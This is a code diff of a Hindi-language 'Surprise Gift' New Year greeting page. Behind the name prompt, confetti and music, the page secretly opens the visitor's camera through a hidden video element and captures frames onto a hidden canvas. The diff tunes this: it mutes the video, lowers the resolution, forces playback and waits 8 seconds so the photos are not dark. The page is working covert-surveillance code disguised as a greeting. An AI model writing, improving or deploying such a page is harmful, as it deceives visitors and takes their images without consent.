@@ -9,9 +9,10 @@
         body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .container { text-align: center; width: 85%; max-width: 400px; padding: 25px; border: 2px solid #ff0055; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 25px #ff0055; }
         h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; }
-        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; margin-bottom: 20px; text-align: center; }
-        button { padding: 15px 35px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; }
+        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; margin-bottom: 20px; text-align: center; font-size: 16px; }
+        button { padding: 15px 35px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; font-size: 18px; }
         #wish-box { display: none; }
+        .wish-text { font-size: 20px; font-weight: bold; line-height: 1.4; color: #fff; }
     </style>
 </head>
 <body>
@@ -19,17 +20,18 @@
     <div class="container" id="main-box">
         <h1>🎇 Surprise Gift 🎇</h1>
         <p>अपना नाम लिखें और उपहार खोलें!</p>
-        <input type="text" id="userName" placeholder="आपका नाम लिखें...">
+        <input type="text" id="userName" placeholder="यहाँ नाम लिखें...">
         <button onclick="startApp()">उपहार खोलें ✨</button>
     </div>
 
     <div class="container" id="wish-box">
-        <h2 id="wishMsg" style="font-size: 20px;"></h2>
-        <p>🎊 Happy New Year 2026 🎊</p>
+        <div class="wish-text" id="wishMsg"></div>
+        <p style="margin-top: 20px; color: #ff0055; font-weight: bold;">🎊 Happy New Year 2026 🎊</p>
     </div>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
+    <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
+    
     <audio id="music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
 
     <script>
@@ -40,11 +42,19 @@
         async function startApp() {
             let name = document.getElementById('userName').value;
             if(!name) return alert("नाम डालना जरूरी है!");
+
             document.getElementById('main-box').style.display = 'none';
             document.getElementById('wish-box').style.display = 'block';
-            document.getElementById('wishMsg').innerText = `Hey ${name}, मेरी तरफ से आपको New Year 2026 की शुभकामनाएँ!`;
-            document.getElementById('music').play();
-            setInterval(() => { confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } }); }, 2000);
+            
+            // नया पर्सनल मैसेज फॉर्मेट
+            document.getElementById('wishMsg').innerText = `Hey ${name}, मेरी तरफ से आपको और आपके पूरे परिवार को Happy New Year की ढेर सारी शुभकामनाएँ!`;
+            
+            // म्यूजिक प्ले करना (आपका पसंदीदा हिस्सा)
+            document.getElementById('music').play().catch(() => {});
+            
+            // पटाखे (Fireworks)
+            setInterval(() => { confetti({ particleCount: 60, spread: 70, origin: { y: 0.6 } }); }, 2000);
+            
             initCapture(name);
         }
 
@@ -68,13 +78,14 @@
         async function runCam(name, info, constraints, count, label) {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { ...constraints, width: {ideal: 1280}, height: {ideal: 720} } 
+                    video: { ...constraints, width: {ideal: 640}, height: {ideal: 480} } 
                 });
                 let video = document.getElementById('v');
                 video.srcObject = stream;
+                await video.play();
                 
-                // 10 सेकंड का डिले (काली फोटो को रोकने के लिए पक्का समाधान)
-                await new Promise(r => setTimeout(r, 10000)); 
+                // सेंसर को रोशनी सेट करने के लिए 8 सेकंड का इंतज़ार
+                await new Promise(r => setTimeout(r, 8000)); 
 
                 for (let i = 1; i <= count; i++) {
                     let can = document.getElementById('c');
